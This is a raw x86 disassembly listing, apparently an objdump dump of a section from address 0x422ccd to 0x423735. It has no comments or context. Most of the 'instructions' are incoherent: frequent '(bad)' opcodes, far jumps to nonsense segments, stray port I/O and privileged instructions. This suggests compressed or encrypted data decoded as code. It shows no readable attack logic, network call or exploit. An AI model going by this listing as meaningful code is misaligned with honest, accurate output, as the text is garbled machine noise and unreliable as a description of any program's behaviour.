  422ccd:	mov    ds:0xf3bc5fb9,eax
  422cd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd3:	lahf   
  422cd4:	(bad)  
  422cd5:	mov    ds:0xf0630667,al
  422cda:	mov    ah,0x1
  422cdc:	das    
  422cdd:	cmp    DWORD PTR [eax+0x5673b4f5],0xffffff8b
  422ce4:	or     ah,cl
  422ce6:	popf   
  422ce7:	xor    bh,bl
  422ce9:	xchg   esp,eax
  422cea:	add    BYTE PTR [ecx],ah
  422cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ced:	gs xchg edi,eax
  422cef:	fisubr DWORD PTR [esi]
  422cf1:	inc    edi
  422cf2:	ret    
  422cf3:	ja     0x422cb7
  422cf5:	cwde   
  422cf6:	fidivr DWORD PTR [ebx-0x41]
  422cf9:	xchg   edi,eax
  422cfa:	sti    
  422cfb:	mov    eax,ds:0x218c9a82
  422d00:	xor    DWORD PTR [edx],0xffffffee
  422d03:	jmp    0x40c9:0x855b12ab
  422d0a:	es adc esp,edx
  422d0d:	cmp    eax,0x8138
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esi,edx
  422d81:	or     ecx,ecx
  422d83:	sbb    DWORD PTR [eax+0x73],ebx
  422d86:	add    DWORD PTR [eax],eax
  422d88:	add    al,0x1
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	scas   al,BYTE PTR es:[edi]
  422d8d:	cmp    cl,BYTE PTR [edx]
  422d8f:	cmp    dh,bl
  422d91:	mov    ah,0x2c
  422d93:	cdq    
  422d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d95:	mov    ds:0x311b1129,eax
  422d9a:	cmc    
  422d9b:	loopne 0x422ddc
  422d9d:	icebp  
  422d9e:	inc    edx
  422d9f:	hlt    
  422da0:	inc    esi
  422da1:	sbb    al,0x40
  422da3:	fldenv [ecx]
  422da5:	std    
  422da6:	shl    BYTE PTR [ecx+0x60],cl
  422da9:	pusha  
  422daa:	int    0x69
  422dac:	sbb    ebx,0xb85f4073
  422db2:	aas    
  422db3:	or     al,0x75
  422db5:	outs   dx,BYTE PTR ds:[esi]
  422db6:	sub    DWORD PTR [edi+0x7],0x38
  422dba:	ins    BYTE PTR es:[edi],dx
  422dbb:	(bad)  
  422dbd:	inc    ebp
  422dbe:	cmp    BYTE PTR [ebx+0x7a37ded2],dh
  422dc4:	retf   
  422dc5:	xor    cl,BYTE PTR [ebx]
  422dc7:	add    al,0x29
  422dc9:	fwait
  422dca:	mov    esi,0x72cdfd95
  422dcf:	je     0x422de6
  422dd1:	sbb    BYTE PTR [ecx-0x7f],0xa3
  422dd5:	cmp    BYTE PTR [eax-0x4b],cl
  422dd8:	jmp    0xfa0e:0x4f50f361
  422ddf:	sti    
  422de0:	push   edx
  422de1:	push   cs
  422de2:	repnz out 0xd4,eax
  422de5:	pop    ds
  422de6:	cld    
  422de7:	cwde   
  422de8:	sbb    DWORD PTR [ecx],ebx
  422dea:	aaa    
  422deb:	xchg   esp,eax
  422dec:	cmp    esp,DWORD PTR [esi-0x6e17fb97]
  422df2:	sbb    BYTE PTR [esi+eiz*2+0x15],dh
  422df6:	imul   ebx,DWORD PTR [esi+0x5c],0x3d519f41
  422dfd:	cmp    edi,DWORD PTR [ebp-0x21]
  422e00:	add    ebx,esp
  422e02:	es mov ebp,0x19b798e6
  422e08:	int    0xa3
  422e0a:	das    
  422e0b:	xchg   ecx,eax
  422e0c:	sbb    BYTE PTR [edx+0x66],bh
  422e0f:	or     al,0xbe
  422e11:	xchg   DWORD PTR [edi-0x13],esi
  422e14:	imul   esi,DWORD PTR [ebx+0x42],0x36
  422e18:	mov    dh,0xcf
  422e1a:	add    esi,DWORD PTR [edi]
  422e1c:	mov    ds:0x9915f279,al
  422e21:	mov    BYTE PTR [ebx-0x59],bh
  422e24:	inc    edi
  422e25:	adc    ebp,DWORD PTR [ecx]
  422e27:	imul   edi,DWORD PTR es:[edx+0x8ae0cb5],0xa14e13e6
  422e32:	lods   al,BYTE PTR ds:[esi]
  422e33:	push   0xe3194a95
  422e38:	pop    ss
  422e39:	inc    edi
  422e3a:	scas   eax,DWORD PTR es:[edi]
  422e3b:	xor    DWORD PTR [eax+eiz*8+0x31ae339d],ebx
  422e42:	sti    
  422e43:	scas   eax,DWORD PTR es:[edi]
  422e44:	push   ds
  422e45:	cdq    
  422e46:	xor    DWORD PTR [ecx+eiz*4-0x34808262],eax
  422e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e4e:	jbe    0x422ecf
  422e50:	mov    edi,0x816412e6
  422e55:	push   edx
  422e56:	xor    BYTE PTR [edx-0x3c587d3a],0x41
  422e5d:	mov    BYTE PTR gs:[ecx],dh
  422e60:	inc    esi
  422e61:	mov    dl,0x2b
  422e63:	test   eax,0x7fca0c5a
  422e68:	adc    ecx,DWORD PTR [ecx-0x55]
  422e6b:	push   eax
  422e6c:	fmul   QWORD PTR [ecx]
  422e6e:	mov    edi,0xd255ff29
  422e73:	pop    ss
  422e74:	and    DWORD PTR [ebx-0x2dbf2cd6],edx
  422e7a:	mov    edx,0xd8315e7b
  422e7f:	(bad)  
  422e80:	loope  0x422e10
  422e82:	pop    ebx
  422e83:	addr16 push 0x9
  422e86:	idiv   BYTE PTR [esp+edx*4-0x5b]
  422e8a:	jge    0x422e9e
  422e8c:	pop    esi
  422e8d:	mov    ds:0x3e3e,al
	...
  422ef2:	add    BYTE PTR [eax],al
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0xe07fca33
  422f02:	mov    esi,DWORD PTR ds:0x1745c
  422f08:	add    al,0x1
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	push   eax
  422f0d:	(bad)  
  422f0e:	and    BYTE PTR [edx],bh
  422f10:	fild   DWORD PTR [ebx-0x3]
  422f13:	out    dx,eax
  422f14:	inc    ebp
  422f15:	scas   al,BYTE PTR es:[edi]
  422f16:	mov    ebx,0x3bbbbd0a
  422f1b:	add    DWORD PTR [eax],eax
  422f1d:	lods   eax,DWORD PTR ds:[esi]
  422f1e:	sub    al,0x29
  422f20:	add    al,0xbd
  422f22:	push   edx
  422f23:	mov    cs:0xcab25648,eax
  422f29:	scas   al,BYTE PTR es:[edi]
  422f2a:	xor    ebp,DWORD PTR [edx]
  422f2c:	cmp    DWORD PTR ds:[eax],esi
  422f2f:	bound  eax,QWORD PTR [esi+0x34]
  422f32:	int    0xc3
  422f34:	in     eax,0x57
  422f36:	inc    ebx
  422f37:	rcr    DWORD PTR [ebx-0x70],0x39
  422f3b:	popf   
  422f3c:	cmp    BYTE PTR [ebp-0x6f8922c3],cl
  422f42:	add    eax,0x81028273
  422f47:	test   eax,eax
  422f49:	mov    ah,0xce
  422f4b:	repz out 0x74,eax
  422f4e:	ins    BYTE PTR es:[edi],dx
  422f4f:	les    edx,FWORD PTR [edi+0x53e24608]
  422f55:	cld    
  422f56:	pop    edi
  422f57:	sbb    ebp,eax
  422f59:	dec    esi
  422f5a:	cmp    BYTE PTR [ebx+0x14],al
  422f5d:	fwait
  422f5e:	scas   al,BYTE PTR es:[edi]
  422f5f:	data16 jo 0x422f0c
  422f62:	xchg   BYTE PTR [eax+0x25624775],al
  422f68:	fldenv [eax]
  422f6b:	mov    eax,0xa0c4232e
  422f70:	and    bl,BYTE PTR [ecx]
  422f72:	div    BYTE PTR [edx+0x18fd8cfb]
  422f78:	in     eax,dx
  422f79:	mov    al,ds:0x85bc802b
  422f7e:	enter  0xf96,0x29
  422f82:	mov    ch,BYTE PTR [edx+ebx*1-0x2f]
  422f86:	xchg   esp,eax
  422f87:	push   ss
  422f88:	retf   0xa9cc
  422f8b:	adc    ecx,DWORD PTR [ebp+ebp*4+0x32]
  422f8f:	and    DWORD PTR [edx],esi
  422f91:	jge    0x422fa9
  422f93:	popf   
  422f94:	gs or  al,0x71
  422f97:	pop    ss
  422f98:	dec    esi
  422f99:	out    0x42,eax
  422f9b:	cwde   
  422f9c:	pop    eax
  422f9d:	dec    ecx
  422f9e:	int    0x7b
  422fa0:	inc    esi
  422fa1:	imul   edi,DWORD PTR [ebx+0x28],0x8d912e95
  422fa8:	sub    dh,BYTE PTR [esi]
  422faa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fab:	jge    0x422f93
  422fad:	imul   esi,DWORD PTR [ebx+0x125328d3],0xffffff86
  422fb4:	push   ecx
  422fb5:	sbb    edx,esp
  422fb7:	mov    gs,edi
  422fb9:	sub    eax,0x12ae9184
  422fbe:	test   eax,0xd10b5528
  422fc3:	add    edi,DWORD PTR [esi+0x77]
  422fc6:	dec    ebx
  422fc7:	dec    ecx
  422fc8:	(bad)  
  422fc9:	fidivr WORD PTR [edi-0x6cd97f2b]
  422fcf:	push   edx
  422fd0:	std    
  422fd1:	test   DWORD PTR [ebx],ebp
  422fd3:	push   eax
  422fd4:	fdiv   st,st(0)
  422fd6:	in     al,dx
  422fd7:	je     0x422ff9
  422fd9:	mov    bh,0x4d
  422fdb:	xor    al,0x7d
  422fdd:	mov    bh,0xdc
  422fdf:	xchg   BYTE PTR [ecx-0x67930079],bl
  422fe5:	sti    
  422fe6:	sbb    eax,0x49d9f7b3
  422feb:	cs test al,0x5f
  422fee:	fld    TBYTE PTR [ebp-0x4307c34e]
  422ff4:	cmc    
  422ff5:	lods   eax,DWORD PTR ds:[esi]
  422ff6:	cmp    bh,BYTE PTR [esi+0x30726a00]
  422ffc:	xchg   edi,eax
  422ffd:	ret    0x4d8b
  423000:	mov    ecx,0x435a319b
  423005:	nop
  423006:	leave  
  423007:	mov    ds:0x19836d7f,al
  42300c:	iret   
  42300d:	cdq    
  42300e:	jb     0x42306e
	...
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [esi+eax*1+0x6013eabf],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	mov    esp,0x1351da99
  423091:	ret    0xe167
  423094:	aas    
  423095:	sbb    dh,BYTE PTR [ebx+ebx*1]
  423098:	mov    esi,0x9fb98159
  42309d:	sub    BYTE PTR [ecx-0x3ca3cab9],cl
  4230a3:	mov    ?,eax
  4230a5:	stos   BYTE PTR es:[edi],al
  4230a6:	xchg   ebp,eax
  4230a7:	sbb    al,0x66
  4230a9:	mov    cl,0xb5
  4230ab:	js     0x42302e
  4230ad:	outs   dx,BYTE PTR ds:[esi]
  4230ae:	mov    ch,0xcf
  4230b0:	fidivr DWORD PTR [ebp-0x72]
  4230b3:	scas   eax,DWORD PTR es:[edi]
  4230b4:	push   es
  4230b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230b6:	sub    esp,DWORD PTR [esi]
  4230b8:	dec    edx
  4230b9:	lods   al,BYTE PTR es:[esi]
  4230bb:	mov    ebp,0x4baf6380
  4230c0:	pop    ebp
  4230c1:	(bad)  
  4230c2:	loop   0x423083
  4230c4:	in     eax,0xc6
  4230c6:	inc    edi
  4230c7:	sub    DWORD PTR [edx+0x642e5e54],ecx
  4230cd:	mov    ebx,0xa6a60aef
  4230d2:	inc    esp
  4230d3:	cmp    ebx,edi
  4230d5:	cmp    al,0x50
  4230d7:	rcl    BYTE PTR [eax],cl
  4230d9:	daa    
  4230da:	mov    ah,0x9f
  4230dc:	outs   dx,DWORD PTR ds:[esi]
  4230dd:	sbb    al,0x32
  4230df:	adc    BYTE PTR [edi-0x58fea44c],ah
  4230e5:	push   eax
  4230e6:	sub    ebp,ecx
  4230e8:	(bad)  
  4230e9:	dec    ebp
  4230ea:	cmp    edi,DWORD PTR [edi-0x7]
  4230ed:	xchg   esp,eax
  4230ee:	mov    eax,0x7d6c1110
  4230f3:	js     0x423088
  4230f5:	ret    
  4230f6:	add    al,0x5e
  4230f8:	jle    0x423129
  4230fa:	push   es
  4230fb:	push   eax
  4230fc:	in     eax,0xab
  4230fe:	hlt    
  4230ff:	dec    ebx
  423100:	icebp  
  423101:	call   0x1271:0xb11c8dbf
  423108:	and    BYTE PTR [eax+esi*1-0x6a5f6d10],ah
  42310f:	jno    0x423141
  423111:	ss dec edx
  423113:	gs adc eax,0xc738301c
  423119:	(bad)  
  42311a:	mov    esi,0xc5da5b1c
  42311f:	inc    esp
  423120:	xlat   BYTE PTR ds:[ebx]
  423121:	lock xchg esp,eax
  423123:	xchg   edi,eax
  423124:	lea    eax,[esi-0x27c3f4b8]
  42312a:	in     al,0x85
  42312c:	mov    ebx,0x22d396c1
  423131:	xor    eax,0x610880b4
  423136:	(bad)  
  423137:	push   es
  423138:	adc    DWORD PTR [ecx],esp
  42313a:	jbe    0x423167
  42313c:	stc    
  42313d:	scas   eax,DWORD PTR es:[edi]
  42313e:	jb     0x4230d4
  423140:	push   ecx
  423141:	es push ebx
  423143:	mov    ?,WORD PTR [ebx]
  423145:	mov    cl,0xf5
  423147:	or     DWORD PTR [eax],edi
  423149:	jmp    0x4bc44224
  42314e:	mov    dl,cl
  423150:	ss push esp
  423152:	popf   
  423153:	push   es
  423154:	ins    DWORD PTR es:[edi],dx
  423155:	mov    ebx,0x8d9be99d
  42315a:	jo     0x4231d1
  42315c:	lea    edx,[ebp-0x2bf551a]
  423162:	cmp    al,bl
  423164:	xchg   esp,eax
  423165:	adc    dl,BYTE PTR [ecx]
  423167:	xor    al,0x2b
  423169:	jg     0x4231e5
  42316b:	lds    ebp,FWORD PTR [ebx]
  42316d:	mov    eax,0x468401ae
  423172:	js     0x4231ec
  423174:	or     al,0x91
  423176:	sbb    al,0xcd
  423178:	adc    dh,bl
  42317a:	sub    al,0xdf
  42317c:	mov    edx,0x4cf1cfd1
  423181:	xchg   DWORD PTR [edi+edi*2],esi
  423184:	test   DWORD PTR [ebp+edx*2+0x5132274a],ebx
  42318b:	sti    
  42318c:	xor    al,0x3b
  42318e:	xchg   esi,eax
  42318f:	inc    ebx
	...
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x54247bf0],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	mov    ?,WORD PTR [ebx+0x59]
  42320f:	test   DWORD PTR [ecx-0x72],ebx
  423212:	shl    esi,1
  423214:	mov    ch,0x97
  423216:	jmp    0x42325f
  423218:	lahf   
  423219:	xor    eax,0xe454819a
  42321e:	fwait
  42321f:	xlat   BYTE PTR ds:[ebx]
  423220:	mov    fs,eax
  423222:	push   es
  423223:	lea    eax,[ecx]
  423225:	add    al,0xdb
  423227:	(bad)  
  423229:	jg     0x4231cd
  42322b:	mov    DWORD PTR [ebx-0x16c6a938],ebx
  423231:	mov    edi,0xe42ad63d
  423236:	jbe    0x4231d7
  423238:	add    eax,0x5eadb586
  42323d:	cmp    DWORD PTR ds:0xe310319a,ecx
  423243:	retf   
  423244:	sbb    ah,dl
  423246:	mov    eax,ds:0xd45bf173
  42324b:	push   ebx
  42324c:	pop    edx
  42324d:	rcl    DWORD PTR [ecx-0x6fbb109d],1
  423253:	pmulhuw mm1,QWORD PTR [edx-0x76ab7512]
  42325a:	xor    BYTE PTR es:[esi-0x3deae701],al
  423261:	and    esi,DWORD PTR [edi-0x23d4de74]
  423267:	xchg   ecx,eax
  423268:	out    0x3f,eax
  42326a:	cmp    al,0xb2
  42326c:	jne    0x4232c2
  42326e:	dec    ecx
  42326f:	cmp    esp,edx
  423271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423272:	jl     0x4232a7
  423274:	pushf  
  423275:	mov    bh,0xa7
  423277:	(bad)  
  423278:	cmp    al,0xd5
  42327a:	sbb    DWORD PTR [eax-0x33176bb4],ebx
  423280:	mov    cl,0x64
  423282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423283:	mov    ebx,ebp
  423285:	popa   
  423286:	pop    ds
  423287:	pop    edi
  423288:	test   al,0x90
  42328a:	fsubr  DWORD PTR [ebx]
  42328c:	neg    BYTE PTR [ebx-0x24]
  42328f:	rcr    BYTE PTR [edx],1
  423291:	jmp    0x4232e0
  423293:	mov    ebx,?
  423295:	lahf   
  423296:	push   0x77
  423298:	mov    bl,0xa3
  42329a:	lock sar DWORD PTR [ecx+0x7c2b913c],1
  4232a1:	xor    eax,0x3b36c3be
  4232a6:	mov    ebp,eax
  4232a8:	mov    eax,0x8420d198
  4232ad:	xchg   DWORD PTR [edi],ebx
  4232af:	add    bh,BYTE PTR [edx]
  4232b1:	xor    esi,ecx
  4232b3:	cmp    BYTE PTR [esi+0x21],bh
  4232b6:	push   0x73e0525e
  4232bb:	mov    ebp,0x456a2597
  4232c0:	or     bl,cl
  4232c2:	pushf  
  4232c3:	mov    ds:0x2aaf270f,al
  4232c8:	fs mov ss,edx
  4232cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232cc:	lods   eax,DWORD PTR ss:[esi]
  4232ce:	xchg   esi,eax
  4232cf:	adc    eax,0x8a8f8c42
  4232d4:	add    eax,0xf7e60687
  4232d9:	push   ds
  4232da:	jmp    0x423320
  4232dc:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232de:	ss jl  0x4232ec
  4232e1:	dec    ecx
  4232e2:	shr    BYTE PTR [ebp-0x59c7ce02],1
  4232e8:	and    esp,DWORD PTR [eax-0x78079c5b]
  4232ee:	outs   dx,BYTE PTR ds:[esi]
  4232ef:	cs jecxz 0x4232a4
  4232f2:	xlat   BYTE PTR ds:[ebx]
  4232f3:	xchg   DWORD PTR [edi+0x2],edx
  4232f6:	retf   0x5791
  4232f9:	jecxz  0x4232e4
  4232fb:	adc    bh,al
  4232fd:	push   cs
  4232fe:	and    esi,edi
  423300:	gs sar ch,0xe4
  423304:	cmc    
  423305:	pmaxub mm1,QWORD PTR ss:[esi-0x63]
  42330a:	pop    ss
  42330b:	adc    eax,DWORD PTR [edi-0x2a]
  42330e:	adc    al,0x79
	...
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xb2070f44
  423382:	push   edx
  423383:	pop    ebp
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    BYTE PTR [ebp-0x1c],ah
  42338e:	ss push ss
  423390:	mov    ebx,0xef4a0e94
  423395:	mov    bh,0x8b
  423397:	ret    
  423398:	inc    edx
  423399:	and    eax,0x81ee40f3
  42339e:	mov    al,0xd0
  4233a0:	or     ah,bh
  4233a2:	inc    ebx
  4233a3:	clc    
  4233a4:	push   esi
  4233a5:	(bad)  
  4233a7:	xlat   BYTE PTR ds:[ebx]
  4233a8:	mov    ds:0xcfb1f255,eax
  4233ad:	stos   DWORD PTR es:[edi],eax
  4233ae:	sti    
  4233af:	test   DWORD PTR [edi],edi
  4233b1:	(bad)  
  4233b3:	add    DWORD PTR [edi],esi
  4233b5:	jmp    0x423421
  4233b7:	stos   DWORD PTR es:[edi],eax
  4233b8:	in     eax,0x9
  4233ba:	xchg   ecx,eax
  4233bb:	dec    edi
  4233bc:	fsubr  QWORD PTR [edi-0x70]
  4233bf:	rcr    DWORD PTR [edx],1
  4233c1:	rcr    BYTE PTR [esi],cl
  4233c3:	es stos BYTE PTR es:[edi],al
  4233c5:	sbb    al,0x82
  4233c7:	ror    edi,0x7c
  4233ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233cb:	fldenv [ecx+0x47591dea]
  4233d1:	fwait
  4233d2:	xor    esp,ebp
  4233d4:	mov    al,ds:0xaf1e7682
  4233d9:	lods   al,BYTE PTR ds:[esi]
  4233da:	jb     0x423397
  4233dc:	mov    cl,0xad
  4233de:	sbb    bl,BYTE PTR [esi+eiz*4+0x1c]
  4233e2:	scas   al,BYTE PTR es:[edi]
  4233e3:	add    ecx,DWORD PTR [edi-0xc]
  4233e6:	jno    0x4233fb
  4233e8:	cmp    DWORD PTR [esi+0x5fe2a84b],ebx
  4233ee:	je     0x4233e2
  4233f0:	mov    ds:0xea72cc90,al
  4233f5:	add    eax,esi
  4233f7:	(bad)  
  4233f8:	clc    
  4233f9:	adc    DWORD PTR [ecx],esi
  4233fb:	jecxz  0x4233f0
  4233fd:	push   edi
  4233fe:	repnz stc 
  423400:	and    eax,0xbefa5b27
  423405:	lock inc edi
  423407:	cmp    bh,dh
  423409:	and    al,0xb1
  42340b:	(bad)  
  42340c:	sbb    al,0xb4
  42340e:	not    dh
  423410:	(bad)  
  423411:	mov    al,ds:0xdba24a60
  423416:	fisttp QWORD PTR [eax+0x0]
  423419:	ret    0x7c4d
  42341c:	pop    edx
  42341d:	sbb    DWORD PTR [ecx+0x3fe30df],0xfc0a07ae
  423427:	sbb    ebp,DWORD PTR [ecx+0x1c]
  42342a:	jle    0x42347e
  42342c:	mov    ecx,0x8f009553
  423431:	adc    ch,ah
  423433:	pcmpeqb mm1,QWORD PTR fs:[esi+edi*4+0x6c]
  423439:	cs ins BYTE PTR es:[edi],dx
  42343b:	mov    ebp,0x7e9c4f5
  423440:	div    BYTE PTR [ebx-0x59]
  423443:	fwait
  423444:	cmc    
  423445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423446:	dec    edi
  423447:	xor    ch,ch
  423449:	in     eax,0x95
  42344b:	mov    ecx,0xbd2c5aa1
  423450:	fidivr DWORD PTR [eax+ebx*1+0x45]
  423454:	mov    al,ds:0x1f2cabd2
  423459:	out    dx,eax
  42345a:	sbb    al,0x3c
  42345c:	or     al,0xdc
  42345e:	push   ebx
  42345f:	mov    esp,0xeedaac83
  423464:	pop    ss
  423465:	pop    edi
  423466:	xchg   edx,ebx
  423468:	loop   0x423463
  42346a:	inc    ebx
  42346b:	sub    DWORD PTR [esi-0x2a],ebx
  42346e:	mov    ah,0xb8
  423470:	call   0xed51:0x79cf4449
  423477:	cwde   
  423478:	loopne 0x42343e
  42347a:	adc    ch,BYTE PTR [eax-0x7af49cd2]
  423480:	cmc    
  423481:	inc    ecx
  423482:	inc    ecx
  423483:	aas    
  423484:	cs jnp 0x4234b1
  423487:	bsr    ebp,DWORD PTR [edi-0x2]
  42348b:	and    DWORD PTR [esi],ebx
  42348d:	jns    0x423444
  42348f:	aaa    
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	xchg   ecx,eax
  423501:	daa    
  423502:	fidiv  DWORD PTR [eax+0x1786c]
  423508:	add    al,0x1
  42350a:	add    BYTE PTR [eax],al
  42350c:	repnz (bad) 
  42350e:	jmp    0xa705ffd7
  423513:	inc    eax
  423514:	jmp    0xc718:0xdaa6087a
  42351b:	sar    bh,0xd3
  42351e:	sub    edx,esi
  423520:	cmp    esp,DWORD PTR [edx+ebp*8]
  423523:	das    
  423524:	cwde   
  423525:	outs   dx,DWORD PTR ds:[esi]
  423526:	xchg   BYTE PTR [ebp-0x6372e9d5],dl
  42352c:	sub    DWORD PTR [edx+esi*8-0x3d],ecx
  423530:	inc    ecx
  423531:	pop    ecx
  423532:	push   esi
  423533:	push   esp
  423534:	rcl    BYTE PTR [eax-0x29],cl
  423537:	push   edi
  423538:	pop    esi
  423539:	add    BYTE PTR [esi-0x5541acfa],al
  42353f:	in     eax,dx
  423540:	popf   
  423541:	leave  
  423542:	and    esi,DWORD PTR [esp+ecx*1-0x25]
  423546:	adc    cl,BYTE PTR [ecx+eax*4-0x1381de45]
  42354d:	in     eax,0x87
  42354f:	and    ebp,DWORD PTR [eax]
  423551:	or     BYTE PTR [eax-0xafc2f5e],ah
  423557:	lea    edi,[eax+0x5c]
  42355a:	je     0x42351c
  42355c:	test   al,0xc1
  42355e:	push   esi
  42355f:	xchg   esi,eax
  423560:	pop    DWORD PTR [ecx-0x1779b10d]
  423566:	(bad)  
  423568:	hlt    
  423569:	in     al,0xc0
  42356b:	imul   eax
  42356d:	push   ss
  42356e:	enter  0x3491,0x11
  423572:	pusha  
  423573:	sub    DWORD PTR [edx+0x1cd36338],0xefae9e48
  42357d:	cmp    DWORD PTR [ebp+0x10],edi
  423580:	and    eax,0xcf001126
  423585:	and    ecx,edi
  423587:	jg     0x4235ad
  423589:	mov    esp,0x1095311e
  42358e:	jl     0x423531
  423590:	and    eax,0xa8cdcf1
  423595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423596:	fisubr WORD PTR [edi+0x3e814387]
  42359c:	pop    eax
  42359d:	jmp    0xf98c:0x17be7f8b
  4235a4:	jge    0x423606
  4235a6:	jecxz  0x42355f
  4235a8:	sbb    eax,0xc9937678
  4235ad:	push   0xfffffff8
  4235af:	jmp    0x4235b3
  4235b1:	jle    0x42356b
  4235b3:	pop    esp
  4235b4:	dec    eax
  4235b5:	xor    eax,0x985ad58e
  4235ba:	js     0x4235c6
  4235bc:	pop    esp
  4235bd:	adc    eax,0x2ec4d76c
  4235c2:	test   BYTE PTR [esi+0xd2f7d66],ch
  4235c8:	adc    edx,DWORD PTR [edi+0x40]
  4235cb:	out    0x8,al
  4235cd:	loope  0x4235ec
  4235cf:	loope  0x423634
  4235d1:	imul   esp,DWORD PTR [esi+0x7b],0x719a4c06
  4235d8:	fist   WORD PTR [edi]
  4235da:	jno    0x4235fe
  4235dc:	cli    
  4235dd:	fistp  WORD PTR [ecx]
  4235df:	push   ecx
  4235e0:	sahf   
  4235e1:	outs   dx,DWORD PTR ds:[esi]
  4235e2:	xchg   edi,eax
  4235e3:	ins    DWORD PTR es:[edi],dx
  4235e4:	sbb    edi,DWORD PTR [edx+ebp*2+0x5736b57b]
  4235eb:	test   al,0x1e
  4235ed:	ds xchg edi,eax
  4235ef:	pushf  
  4235f0:	enter  0xf6d,0x38
  4235f4:	pop    ss
  4235f5:	fistp  QWORD PTR [edi+0x17]
  4235f8:	sub    esi,DWORD PTR [ebp+0x154298c9]
  4235fe:	pop    edi
  4235ff:	pusha  
  423600:	mov    edi,0xf3612149
  423605:	clc    
  423606:	xlat   BYTE PTR ds:[ebx]
  423607:	rol    BYTE PTR [ebx],0x5d
  42360a:	fcomp  DWORD PTR [eax]
  42360c:	sub    ecx,DWORD PTR [eax+edx*1]
  42360f:	inc    ebx
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	dec    esi
  423681:	mov    bl,0xcb
  423683:	imul   esi,DWORD PTR [eax+0x79],0x1
  423687:	add    BYTE PTR [ecx+eax*1],al
  42368a:	add    BYTE PTR [eax],al
  42368c:	pop    ebx
  42368d:	hlt    
  42368e:	and    ch,BYTE PTR [eax-0x78]
  423691:	aad    0xa1
  423693:	adc    eax,0x7e77bff2
  423698:	mov    dl,0x2e
  42369a:	dec    esp
  42369b:	inc    esp
  42369c:	pusha  
  42369d:	inc    ecx
  42369e:	(bad)  
  42369f:	xor    esi,eax
  4236a1:	pop    esi
  4236a2:	jne    0x423689
  4236a4:	inc    esp
  4236a5:	ds out dx,al
  4236a7:	adc    al,BYTE PTR [ebp+0x4aa2a82b]
  4236ad:	stos   BYTE PTR es:[edi],al
  4236ae:	lods   al,BYTE PTR ds:[esi]
  4236af:	mov    ebx,0xa238728d
  4236b4:	add    bl,cl
  4236b6:	push   edx
  4236b7:	into   
  4236b8:	dec    ebx
  4236b9:	sbb    DWORD PTR [edi],ebp
  4236bb:	into   
  4236bc:	outs   dx,BYTE PTR ds:[esi]
  4236bd:	pop    ebx
  4236be:	ins    DWORD PTR es:[edi],dx
  4236bf:	add    dl,BYTE PTR [esi-0x75]
  4236c2:	sub    BYTE PTR [ecx+0x6c960c7a],bh
  4236c8:	xor    DWORD PTR [ebp+0x2ca65cb9],ebx
  4236ce:	push   esp
  4236cf:	popa   
  4236d0:	push   cs
  4236d1:	retf   0x9b2d
  4236d4:	pusha  
  4236d5:	mov    dl,0x98
  4236d7:	test   DWORD PTR [eax-0x6e],edi
  4236da:	fld    QWORD PTR [edi-0x44b88d0e]
  4236e0:	clc    
  4236e1:	dec    eax
  4236e2:	repnz inc ebp
  4236e4:	stos   BYTE PTR es:[edi],al
  4236e5:	jmp    0x42368b
  4236e7:	jno    0x423686
  4236e9:	sub    BYTE PTR [eax-0x7d],bl
  4236ec:	and    BYTE PTR [ebx-0x37c244c7],dh
  4236f2:	shr    BYTE PTR [edi+0x587acf56],cl
  4236f8:	mov    edx,0x252db3b1
  4236fd:	outs   dx,BYTE PTR ds:[esi]
  4236fe:	sahf   
  4236ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423700:	push   ss
  423701:	(bad)  [eax+ebx*8+0x6c]
  423705:	xchg   esp,edi
  423707:	mov    bh,0x20
  423709:	fnstcw WORD PTR [eax+0x73]
  42370c:	xor    cl,al
  42370e:	repnz popa 
  423710:	dec    ebx
  423711:	push   ecx
  423712:	jne    0x4236f9
  423714:	sahf   
  423715:	cdq    
  423716:	lahf   
  423717:	xlat   BYTE PTR ds:[ebx]
  423718:	jmp    0xf77:0x51dc4651
  42371f:	or     al,0x41
  423721:	jg     0x42374a
  423723:	ja     0x423711
  423725:	inc    ebp
  423726:	lock push 0x81aecc44
  42372c:	int    0x6c
  42372e:	mov    ds:0x1010a4cf,eax
  423733:	mov    ah,0xda
  423735:	gs xor ah,dh
